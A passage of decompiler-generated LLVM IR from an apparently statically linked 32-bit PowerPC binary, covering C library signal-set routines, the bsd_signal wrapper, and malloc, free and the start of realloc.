dec_label_pc_1000e1e0:                            ; preds = %dec_label_pc_1000e1c4, %dec_label_pc_1000e1d8
  %v0_1000e1e4 = phi i32 [ %v0_1000e1e4.pre, %dec_label_pc_1000e1c4 ], [ %v0_1000e1d8, %dec_label_pc_1000e1d8 ]
  ret i32 %v0_1000e1e4

; uselistorder directives
  uselistorder label %dec_label_pc_1000e1e0, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268493324, i32* @lr, align 4
  %v3_1000e208 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000e220 = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000e220, label %dec_label_pc_1000e24c, label %dec_label_pc_1000e23c

dec_label_pc_1000e23c:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000e24c, label %dec_label_pc_1000e244

dec_label_pc_1000e244:                            ; preds = %dec_label_pc_1000e23c
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000e27c.lr.ph, label %dec_label_pc_1000e24c

dec_label_pc_1000e24c:                            ; preds = %dec_label_pc_1000e244, %dec_label_pc_1000e23c, %entry
  %v0_1000e24c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000e258 = inttoptr i32 %v0_1000e24c to i32*
  store i32 22, i32* %v2_1000e258, align 4
  %v0_1000e2ec.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e2e8

dec_label_pc_1000e27c.lr.ph:                      ; preds = %dec_label_pc_1000e244
  %v2_1000e26c = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000e26c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000e27c22 = add i32 %v2_1000e26c, 128
  %v3_1000e27c23 = inttoptr i32 %v2_1000e27c22 to i32*
  store i32 0, i32* %v3_1000e27c23, align 4
  %v0_1000e28024 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e28025 = add i32 %v0_1000e28024, -1
  store i32 %v1_1000e28025, i32* %r11.global-to-local, align 4
  %v1_1000e28426 = mul i32 %v1_1000e28025, 4
  %v1_1000e28827 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000e28828 = add i32 %v1_1000e28827, %v1_1000e28426
  store i32 %v2_1000e28828, i32* %r9.global-to-local, align 4
  %v0_1000e28c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e28c30 = add i32 %v0_1000e28c29, -1
  store i32 %v1_1000e28c30, i32* %ctr.global-to-local, align 4
  %v2_1000e28c31 = icmp eq i32 %v1_1000e28c30, 0
  br i1 %v2_1000e28c31, label %dec_label_pc_1000e290, label %dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge

dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge: ; preds = %dec_label_pc_1000e27c.lr.ph, %dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge
  %v2_1000e28832 = phi i32 [ %v2_1000e288, %dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge ], [ %v2_1000e28828, %dec_label_pc_1000e27c.lr.ph ]
  %v0_1000e27c.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000e27c = add i32 %v2_1000e28832, 4
  %v3_1000e27c = inttoptr i32 %v2_1000e27c to i32*
  store i32 %v0_1000e27c.pre, i32* %v3_1000e27c, align 4
  %v0_1000e280 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000e280 = add i32 %v0_1000e280, -1
  store i32 %v1_1000e280, i32* %r11.global-to-local, align 4
  %v1_1000e284 = mul i32 %v1_1000e280, 4
  %v1_1000e288 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000e288 = add i32 %v1_1000e288, %v1_1000e284
  store i32 %v2_1000e288, i32* %r9.global-to-local, align 4
  %v0_1000e28c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e28c = add i32 %v0_1000e28c, -1
  store i32 %v1_1000e28c, i32* %ctr.global-to-local, align 4
  %v2_1000e28c = icmp eq i32 %v1_1000e28c, 0
  br i1 %v2_1000e28c, label %dec_label_pc_1000e290, label %dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge

dec_label_pc_1000e290:                            ; preds = %dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge, %dec_label_pc_1000e27c.lr.ph
  %v0_1000e294.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e290 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1000e290, i32* @r3, align 4
  store i32 %v0_1000e294.pre, i32* @r4, align 4
  %v0_1000e298 = call i32 @__sigaddset()
  %v1_1000e29c = icmp slt i32 %v0_1000e298, 0
  br i1 %v1_1000e29c, label %dec_label_pc_1000e2e4, label %dec_label_pc_1000e2a4

dec_label_pc_1000e2a4:                            ; preds = %dec_label_pc_1000e290
  %v0_1000e2a8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e2b0 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_100348a8.877 to i32), i32 %v0_1000e2a8)
  %v2_1000e2bc = ptrtoint i32* %stack_var_-156 to i32
  store i32 268493524, i32* @lr, align 4
  %v4_1000e2d0 = call i32 @__libc_sigaction(i32 %v0_1000e2a8, i32* nonnull %stack_var_-296, i32 %v2_1000e2bc)
  %v1_1000e2d4 = icmp slt i32 %v4_1000e2d0, 0
  br i1 %v1_1000e2d4, label %dec_label_pc_1000e2e4, label %dec_label_pc_1000e2dc

dec_label_pc_1000e2dc:                            ; preds = %dec_label_pc_1000e2a4
  %v3_1000e2dc = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_1000e2dc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e2e8

dec_label_pc_1000e2e4:                            ; preds = %dec_label_pc_1000e2a4, %dec_label_pc_1000e290
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e2e8

dec_label_pc_1000e2e8:                            ; preds = %dec_label_pc_1000e2dc, %dec_label_pc_1000e24c, %dec_label_pc_1000e2e4
  %v0_1000e2ec = phi i32 [ %v3_1000e2dc, %dec_label_pc_1000e2dc ], [ %v0_1000e2ec.pre, %dec_label_pc_1000e24c ], [ -1, %dec_label_pc_1000e2e4 ]
  ret i32 %v0_1000e2ec

; uselistorder directives
  uselistorder i32 %v1_1000e28c, { 1, 0 }
  uselistorder i32 %v2_1000e288, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder i32 65, { 2, 3, 4, 0, 1 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e2e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e27c.dec_label_pc_1000e27c_crit_edge, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000e300 = add i32 %arg2, -1
  %v1_1000e304 = call i32 @__asm_rlwinm(i32 %v1_1000e300, i32 29, i32 3, i32 29)
  %v1_1000e308 = urem i32 %v1_1000e300, 32
  %v2_1000e30c = add i32 %v1_1000e304, %arg1
  %v3_1000e30c = inttoptr i32 %v2_1000e30c to i32*
  %v4_1000e30c = load i32, i32* %v3_1000e30c, align 4
  %v3_1000e314 = shl i32 1, %v1_1000e308
  %v2_1000e318 = and i32 %v4_1000e30c, %v3_1000e314
  %v2_1000e31c = icmp ne i32 %v2_1000e318, 0
  %v5_1000e320 = zext i1 %v2_1000e31c to i32
  ret i32 %v5_1000e320
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000e328 = load i32, i32* @r4, align 4
  %v1_1000e328 = add i32 %v0_1000e328, -1
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1000e330 = call i32 @__asm_rlwinm(i32 %v1_1000e328, i32 29, i32 3, i32 29)
  %v1_1000e334 = urem i32 %v1_1000e328, 32
  %v1_1000e338 = load i32, i32* @r3, align 4
  %v2_1000e338 = add i32 %v1_1000e338, %v1_1000e330
  %v3_1000e338 = inttoptr i32 %v2_1000e338 to i32*
  %v4_1000e338 = load i32, i32* %v3_1000e338, align 4
  %v0_1000e33c = load i32, i32* %r0.global-to-local, align 4
  %v3_1000e33c = shl i32 %v0_1000e33c, %v1_1000e334
  store i32 %v3_1000e33c, i32* %r0.global-to-local, align 4
  %v2_1000e340 = or i32 %v3_1000e33c, %v4_1000e338
  store i32 %v2_1000e340, i32* %v3_1000e338, align 4
  ret i32 0
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000e350 = add i32 %arg2, -1
  %v1_1000e358 = call i32 @__asm_rlwinm(i32 %v1_1000e350, i32 29, i32 3, i32 29)
  %v1_1000e35c = urem i32 %v1_1000e350, 32
  %v2_1000e360 = add i32 %v1_1000e358, %arg1
  %v3_1000e360 = inttoptr i32 %v2_1000e360 to i32*
  %v4_1000e360 = load i32, i32* %v3_1000e360, align 4
  %v3_1000e364 = shl i32 -2, %v1_1000e35c
  %v4_1000e364 = sub nsw i32 32, %v1_1000e35c
  %v5_1000e364 = lshr i32 -2, %v4_1000e364
  %v6_1000e364 = or i32 %v5_1000e364, %v3_1000e364
  %v2_1000e368 = and i32 %v6_1000e364, %v4_1000e360
  store i32 %v2_1000e368, i32* %v3_1000e360, align 4
  ret i32 0
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_1000e378 = load i32, i32* @r3, align 4
  %v3_1000e378 = icmp eq i32 %v0_1000e378, 0
  br i1 %v3_1000e378, label %dec_label_pc_1000e390, label %dec_label_pc_1000e394

dec_label_pc_1000e390:                            ; preds = %entry
  br label %dec_label_pc_1000e394

dec_label_pc_1000e394:                            ; preds = %entry, %dec_label_pc_1000e390
  %v0_1000e3a4 = phi i32 [ 1, %dec_label_pc_1000e390 ], [ %v0_1000e378, %entry ]
  %v3_1000e398 = icmp ugt i32 %v0_1000e3a4, -8
  br i1 %v3_1000e398, label %dec_label_pc_1000e4a8, label %dec_label_pc_1000e3a0

dec_label_pc_1000e3a0:                            ; preds = %dec_label_pc_1000e394
  %v1_1000e3a4 = add i32 %v0_1000e3a4, 4
  store i32 ptrtoint (i32* @global_var_10034878.878 to i32), i32* @r29, align 4
  store i32 %v1_1000e3a4, i32* %stack_var_-40, align 4
  %v0_1000e3b4 = call i32 @__pthread_return_0()
  %v2_1000e3bc = ptrtoint i32* %stack_var_-40 to i32
  %v3_1000e3c4 = call i32 @__heap_alloc(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -6696) to i32*), i32 %v2_1000e3bc)
  store i32 %v3_1000e3c4, i32* %r31.global-to-local, align 4
  %v0_1000e3d0 = call i32 @__pthread_return_0()
  %v3_1000e3d4 = icmp eq i32 %v3_1000e3c4, 0
  br i1 %v3_1000e3d4, label %dec_label_pc_1000e3dc, label %dec_label_pc_1000e48c.thread

dec_label_pc_1000e48c.thread:                     ; preds = %dec_label_pc_1000e3a0
  br label %dec_label_pc_1000e4a0

dec_label_pc_1000e3dc:                            ; preds = %dec_label_pc_1000e3a0
  %v3_1000e3e0 = load i32, i32* @global_var_1002e638.824, align 4
  store i32 %v3_1000e3e0, i32* %r31.global-to-local, align 4
  %v3_1000e3e4 = load i32, i32* %stack_var_-40, align 4
  %v2_1000e3e8 = icmp ult i32 %v3_1000e3e4, %v3_1000e3e0
  br i1 %v2_1000e3e8, label %dec_label_pc_1000e400, label %dec_label_pc_1000e3f0

dec_label_pc_1000e3f0:                            ; preds = %dec_label_pc_1000e3dc
  %v1_1000e3f4 = sub i32 0, %v3_1000e3e0
  %v2_1000e3f0 = add i32 %v3_1000e3e0, -1
  %v1_1000e3f8 = add i32 %v2_1000e3f0, %v3_1000e3e4
  %v2_1000e3fc = and i32 %v1_1000e3f8, %v1_1000e3f4
  store i32 %v2_1000e3fc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e400

dec_label_pc_1000e400:                            ; preds = %dec_label_pc_1000e3dc, %dec_label_pc_1000e3f0
  %v0_1000e40c = call i32 @__pthread_return_0()
  %v0_1000e410 = load i32, i32* %r31.global-to-local, align 4
  store i32 268493848, i32* @lr, align 4
  %v1_1000e414 = call i32 @__GI_sbrk(i32 %v0_1000e410)
  %v3_1000e418 = icmp eq i32 %v1_1000e414, -1
  br i1 %v3_1000e418, label %dec_label_pc_1000e438, label %dec_label_pc_1000e420

dec_label_pc_1000e420:                            ; preds = %dec_label_pc_1000e400
  %v1_1000e420 = add i32 %v1_1000e414, 3
  %v1_1000e424 = call i32 @__asm_rlwinm(i32 %v1_1000e420, i32 0, i32 0, i32 29)
  store i32 %v1_1000e424, i32* @r30, align 4
  %v4_1000e428 = icmp eq i32 %v1_1000e424, %v1_1000e414
  br i1 %v4_1000e428, label %dec_label_pc_1000e438, label %dec_label_pc_1000e430

dec_label_pc_1000e430:                            ; preds = %dec_label_pc_1000e420
  %v2_1000e430 = sub i32 %v1_1000e424, %v1_1000e414
  store i32 268493880, i32* @lr, align 4
  %v1_1000e434 = call i32 @__GI_sbrk(i32 %v2_1000e430)
  br label %dec_label_pc_1000e438

dec_label_pc_1000e438:                            ; preds = %dec_label_pc_1000e420, %dec_label_pc_1000e400, %dec_label_pc_1000e430
  %v0_1000e440 = call i32 @__pthread_return_0()
  %v0_1000e444 = load i32, i32* @r30, align 4
  %v3_1000e444 = icmp eq i32 %v0_1000e444, -1
  br i1 %v3_1000e444, label %dec_label_pc_1000e4a8, label %dec_label_pc_1000e48c

dec_label_pc_1000e48c:                            ; preds = %dec_label_pc_1000e438
  store i32 ptrtoint (i32* @global_var_10034878.878 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002e5d8 to i32), i32* @r29, align 4
  %v0_1000e460 = call i32 @__pthread_return_0()
  %v0_1000e464 = load i32, i32* @r31, align 4
  %v0_1000e468 = load i32, i32* @r30, align 4
  %v0_1000e46c = load i32, i32* @r29, align 4
  store i32 268493940, i32* @lr, align 4
  %v3_1000e470 = inttoptr i32 %v0_1000e46c to i32*
  %v4_1000e470 = call i32 @__heap_free(i32* %v3_1000e470, i32 %v0_1000e468, i32 %v0_1000e464)
  %v0_1000e474 = load i32, i32* @r29, align 4
  %v2_1000e47c = inttoptr i32 %v0_1000e474 to i32*
  %v3_1000e47c = call i32 @__heap_alloc(i32* %v2_1000e47c, i32 %v2_1000e3bc)
  store i32 %v3_1000e47c, i32* %r31.global-to-local, align 4
  %v0_1000e488 = call i32 @__pthread_return_0()
  %v3_1000e48c = icmp eq i32 %v3_1000e47c, 0
  br i1 %v3_1000e48c, label %dec_label_pc_1000e4a0.thread, label %dec_label_pc_1000e4a0

dec_label_pc_1000e4a0.thread:                     ; preds = %dec_label_pc_1000e48c
  br label %dec_label_pc_1000e4a8

dec_label_pc_1000e4a0:                            ; preds = %dec_label_pc_1000e48c, %dec_label_pc_1000e48c.thread
  %v0_1000e4a0.pr6 = phi i32 [ %v3_1000e3c4, %dec_label_pc_1000e48c.thread ], [ %v3_1000e47c, %dec_label_pc_1000e48c ]
  %v3_1000e494 = load i32, i32* %stack_var_-40, align 4
  %v2_1000e498 = inttoptr i32 %v0_1000e4a0.pr6 to i32*
  store i32 %v3_1000e494, i32* %v2_1000e498, align 4
  %v0_1000e49c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e49c = add i32 %v0_1000e49c, 4
  store i32 %v1_1000e49c, i32* @r31, align 4
  %v3_1000e4a0 = icmp eq i32 %v1_1000e49c, 0
  br i1 %v3_1000e4a0, label %dec_label_pc_1000e4a8, label %dec_label_pc_1000e4b8

dec_label_pc_1000e4a8:                            ; preds = %dec_label_pc_1000e4a0.thread, %dec_label_pc_1000e4a0, %dec_label_pc_1000e438, %dec_label_pc_1000e394
  %v0_1000e4a8 = call i32 @__errno_location()
  %v2_1000e4b0 = inttoptr i32 %v0_1000e4a8 to i32*
  store i32 12, i32* %v2_1000e4b0, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000e4b8

dec_label_pc_1000e4b8:                            ; preds = %dec_label_pc_1000e4a0, %dec_label_pc_1000e4a8
  %v0_1000e4bc = phi i32 [ %v1_1000e49c, %dec_label_pc_1000e4a0 ], [ 0, %dec_label_pc_1000e4a8 ]
  ret i32 %v0_1000e4bc

; uselistorder directives
  uselistorder i32 %v1_1000e49c, { 1, 0, 2 }
  uselistorder i32 %v1_1000e424, { 1, 0, 2 }
  uselistorder i32 %v1_1000e414, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000e3e0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1000e3c4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_1000e4b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4a8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000e438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e400, { 1, 0 }
  uselistorder label %dec_label_pc_1000e394, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_1000e4d0 = load i32, i32* @r3, align 4
  %v3_1000e4d0 = icmp eq i32 %v0_1000e4d0, 0
  br i1 %v3_1000e4d0, label %dec_label_pc_1000e5bc, label %dec_label_pc_1000e4e8

dec_label_pc_1000e4e8:                            ; preds = %entry
  %v1_1000e4ec = add i32 %v0_1000e4d0, -4
  %v2_1000e4ec = inttoptr i32 %v1_1000e4ec to i32*
  %v3_1000e4ec = load i32, i32* %v2_1000e4ec, align 4
  store i32 %v3_1000e4ec, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* @r26, align 4
  %v0_1000e500 = call i32 @__pthread_return_0()
  %v0_1000e508 = load i32, i32* @r28, align 4
  store i32 268494100, i32* @lr, align 4
  %v4_1000e510 = call i32 @__heap_free(i32* nonnull @global_var_1002e5d8, i32 %v1_1000e4ec, i32 %v0_1000e508)
  %v3_1000e518 = load i32, i32* @global_var_1002e638.824, align 4
  store i32 %v4_1000e510, i32* @r29, align 4
  %v1_1000e520 = inttoptr i32 %v4_1000e510 to i32*
  %v2_1000e520 = load i32, i32* %v1_1000e520, align 4
  store i32 %v2_1000e520, i32* @r27, align 4
  %v1_1000e524 = mul i32 %v3_1000e518, 8
  %v2_1000e528 = icmp ult i32 %v2_1000e520, %v1_1000e524
  br i1 %v2_1000e528, label %dec_label_pc_1000e55c, label %dec_label_pc_1000e530

dec_label_pc_1000e530:                            ; preds = %dec_label_pc_1000e4e8
  store i32 ptrtoint (i32* @global_var_10034928.881 to i32), i32* @r28, align 4
  %v0_1000e540 = call i32 @__pthread_return_0()
  store i32 268494156, i32* @lr, align 4
  %v1_1000e548 = call i32 @__GI_sbrk(i32 0)
  %v0_1000e54c = load i32, i32* @r31, align 4
  %v4_1000e54c = icmp eq i32 %v0_1000e54c, %v1_1000e548
  br i1 %v4_1000e54c, label %dec_label_pc_1000e564, label %dec_label_pc_1000e554

dec_label_pc_1000e554:                            ; preds = %dec_label_pc_1000e530
  %v0_1000e558 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000e55c

dec_label_pc_1000e55c:                            ; preds = %dec_label_pc_1000e4e8, %dec_label_pc_1000e554
  br label %dec_label_pc_1000e5b8

dec_label_pc_1000e564:                            ; preds = %dec_label_pc_1000e530
  %v0_1000e564 = load i32, i32* @r29, align 4
  %v1_1000e564 = add i32 %v0_1000e564, 4
  %v2_1000e564 = inttoptr i32 %v1_1000e564 to i32*
  %v3_1000e564 = load i32, i32* %v2_1000e564, align 4
  %v3_1000e568 = icmp eq i32 %v3_1000e564, 0
  br i1 %v3_1000e568, label %dec_label_pc_1000e578, label %dec_label_pc_1000e570

dec_label_pc_1000e570:                            ; preds = %dec_label_pc_1000e564
  %v1_1000e570 = add i32 %v0_1000e564, 8
  %v2_1000e570 = inttoptr i32 %v1_1000e570 to i32*
  %v3_1000e570 = load i32, i32* %v2_1000e570, align 4
  %v2_1000e574 = add i32 %v3_1000e564, 8
  %v3_1000e574 = inttoptr i32 %v2_1000e574 to i32*
  store i32 %v3_1000e570, i32* %v3_1000e574, align 4
  %v0_1000e578.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000e578

dec_label_pc_1000e578:                            ; preds = %dec_label_pc_1000e564, %dec_label_pc_1000e570
  %v0_1000e578 = phi i32 [ %v0_1000e564, %dec_label_pc_1000e564 ], [ %v0_1000e578.pre, %dec_label_pc_1000e570 ]
  %v1_1000e578 = add i32 %v0_1000e578, 8
  %v2_1000e578 = inttoptr i32 %v1_1000e578 to i32*
  %v3_1000e578 = load i32, i32* %v2_1000e578, align 4
  %v1_1000e57c = add i32 %v0_1000e578, 4
  %v2_1000e57c = inttoptr i32 %v1_1000e57c to i32*
  %v3_1000e57c = load i32, i32* %v2_1000e57c, align 4
  %v3_1000e580 = icmp eq i32 %v3_1000e578, 0
  br i1 %v3_1000e580, label %dec_label_pc_1000e590, label %dec_label_pc_1000e588

dec_label_pc_1000e588:                            ; preds = %dec_label_pc_1000e578
  %v2_1000e588 = add i32 %v3_1000e578, 4
  %v3_1000e588 = inttoptr i32 %v2_1000e588 to i32*
  store i32 %v3_1000e57c, i32* %v3_1000e588, align 4
  br label %dec_label_pc_1000e594

dec_label_pc_1000e590:                            ; preds = %dec_label_pc_1000e578
  store i32 %v3_1000e57c, i32* @global_var_1002e5d8, align 4
  br label %dec_label_pc_1000e594

dec_label_pc_1000e594:                            ; preds = %dec_label_pc_1000e588, %dec_label_pc_1000e590
  %v0_1000e59c = call i32 @__pthread_return_0()
  %v0_1000e5a0 = load i32, i32* @r27, align 4
  %v1_1000e5a0 = load i32, i32* @r29, align 4
  %v0_1000e5a8 = load i32, i32* @r31, align 4
  %v2_1000e5a0 = sub i32 12, %v0_1000e5a0
  %v1_1000e5a4 = add i32 %v2_1000e5a0, %v1_1000e5a0
  %v2_1000e5a8 = sub i32 %v1_1000e5a4, %v0_1000e5a8
  store i32 268494256, i32* @lr, align 4
  %v1_1000e5ac = call i32 @__GI_sbrk(i32 %v2_1000e5a8)
  br label %dec_label_pc_1000e5b8

dec_label_pc_1000e5b8:                            ; preds = %dec_label_pc_1000e55c, %dec_label_pc_1000e594
  %v0_1000e5b8 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1000e5bc

dec_label_pc_1000e5bc:                            ; preds = %entry, %dec_label_pc_1000e5b8
  %.0 = phi i32 [ undef, %entry ], [ %v0_1000e5b8, %dec_label_pc_1000e5b8 ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000e578, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e5bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e594, { 1, 0 }
  uselistorder label %dec_label_pc_1000e578, { 1, 0 }
  uselistorder label %dec_label_pc_1000e55c, { 1, 0 }
}

define i32 @realloc(i32 %arg1) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000e5d0 = load i32, i32* @r4, align 4
  %v3_1000e5d0 = icmp eq i32 %v0_1000e5d0, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1000e5d0, label %dec_label_pc_1000e5ec, label %dec_label_pc_1000e5f8

dec_label_pc_1000e5ec:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1000e5f0.884 to i32), i32* @lr, align 4
  %v0_1000e5ec = call i32 @free()
  br label %dec_label_pc_1000e604

dec_label_pc_1000e5f8:                            ; preds = %entry
  %v3_1000e5f8 = icmp eq i32 %arg1, 0
  br i1 %v3_1000e5f8, label %dec_label_pc_1000e604, label %dec_label_pc_1000e610

dec_label_pc_1000e604:                            ; preds = %dec_label_pc_1000e5f8, %dec_label_pc_1000e5ec
  %storemerge = phi i32 [ 0, %dec_label_pc_1000e5ec ], [ %v0_1000e5d0, %dec_label_pc_1000e5f8 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268494344, i32* @lr, align 4
  %v0_1000e604 = call i32 @malloc()
  store i32 %v0_1000e604, i32* @r28, align 4
  br label %dec_label_pc_1000e6e8

dec_label_pc_1000e610:                            ; preds = %dec_label_pc_1000e5f8
  %v1_1000e610 = add i32 %v0_1000e5d0, 7
  %v1_1000e614 = add i32 %arg1, -4
  store i32 %v1_1000e614, i32* %r27.global-to-local, align 4
  %v1_1000e618 = call i32 @__asm_rlwinm(i32 %v1_1000e610, i32 0, i32 0, i32 29)
  store i32 %v1_1000e618, i32* %r31.global-to-local, align 4
  %v2_1000e61c = inttoptr i32 %v1_1000e614 to i32*
  %v3_1000e61c = load i32, i32* %v2_1000e61c, align 4
  store i32 %v3_1000e61c, i32* @r30, align 4
  %v2_1000e620 = icmp ugt i32 %v1_1000e618, 11
  br i1 %v2_1000e620, label %dec_label_pc_1000e62c, label %dec_label_pc_1000e628

dec_label_pc_1000e628:                            ; preds = %dec_label_pc_1000e610
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e62c

dec_label_pc_1000e62c:                            ; preds = %dec_label_pc_1000e610, %dec_label_pc_1000e628
  %v0_1000e6ac = phi i32 [ %v1_1000e618, %dec_label_pc_1000e610 ], [ 12, %dec_label_pc_1000e628 ]
  %v3_1000e62c = icmp ugt i32 %v0_1000e6ac, %v3_1000e61c
  br i1 %v3_1000e62c, label %dec_label_pc_1000e634, label %dec_label_pc_1000e6ac

dec_label_pc_1000e634:                            ; preds = %dec_label_pc_1000e62c
  store i32 ptrtoint (i32* @global_var_10034878.878 to i32), i32* @r29, align 4
  %v0_1000e640 = call i32 @__pthread_return_0()
  %v0_1000e648 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000e648 = load i32, i32* @r30, align 4
  %v2_1000e648 = add i32 %v1_1000e648, %v0_1000e648
  %v1_1000e64c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000e64c = sub i32 %v1_1000e64c, %v1_1000e648
  %v4_1000e654 = call i32 @__heap_alloc_at(i32* nonnull @global_var_1002e5d8, i32 %v2_1000e648, i32 %v2_1000e64c)
  store i32 %v4_1000e654, i32* %r27.global-to-local, align 4
  %v0_1000e660 = call i32 @__pthread_return_0()
  %v3_1000e664 = icmp eq i32 %v4_1000e654, 0
  br i1 %v3_1000e664, label %dec_label_pc_1000e678, label %dec_label_pc_1000e66c

dec_label_pc_1000e66c:                            ; preds = %dec_label_pc_1000e634
  %v0_1000e66c = load i32, i32* @r30, align 4
  %v2_1000e66c = add i32 %v0_1000e66c, %v4_1000e654
  %v1_1000e670 = load i32, i32* @r28, align 4
  %v2_1000e670 = add i32 %v1_1000e670, -4
  %v3_1000e670 = inttoptr i32 %v2_1000e670 to i32*
  store i32 %v2_1000e66c, i32* %v3_1000e670, align 4
  br label %dec_label_pc_1000e6e8

dec_label_pc_1000e678:                            ; preds = %dec_label_pc_1000e634
  %v0_1000e678 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000e678 = add i32 %v0_1000e678, -4
  store i32 %v1_1000e678, i32* @r3, align 4
  store i32 268494464, i32* @lr, align 4
  %v0_1000e67c = call i32 @malloc()
  store i32 %v0_1000e67c, i32* @r3, align 4
  store i32 %v0_1000e67c, i32* @r31, align 4
  %v3_1000e680 = icmp eq i32 %v0_1000e67c, 0
  br i1 %v3_1000e680, label %dec_label_pc_1000e688, label %dec_label_pc_1000e690

dec_label_pc_1000e688:                            ; preds = %dec_label_pc_1000e678
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e6e8

dec_label_pc_1000e690:                            ; preds = %dec_label_pc_1000e678
  %v0_1000e690 = load i32, i32* @r28, align 4
  store i32 %v0_1000e690, i32* @r4, align 4
  %v0_1000e694 = load i32, i32* @r30, align 4
  %v1_1000e694 = add i32 %v0_1000e694, -4
  store i32 %v1_1000e694, i32* @r5, align 4
  store i32 268494492, i32* @lr, align 4
  %v0_1000e698 = call i32 @memcpy()
  %v0_1000e69c = load i32, i32* @r28, align 4
  store i32 %v0_1000e69c, i32* @r3, align 4
  store i32 268494500, i32* @lr, align 4
  %v0_1000e6a0 = call i32 @free()
  %v0_1000e6a4 = load i32, i32* @r31, align 4
  store i32 %v0_1000e6a4, i32* @r28, align 4
  br label %dec_label_pc_1000e6e8

dec_label_pc_1000e6ac:                            ; preds = %dec_label_pc_1000e62c
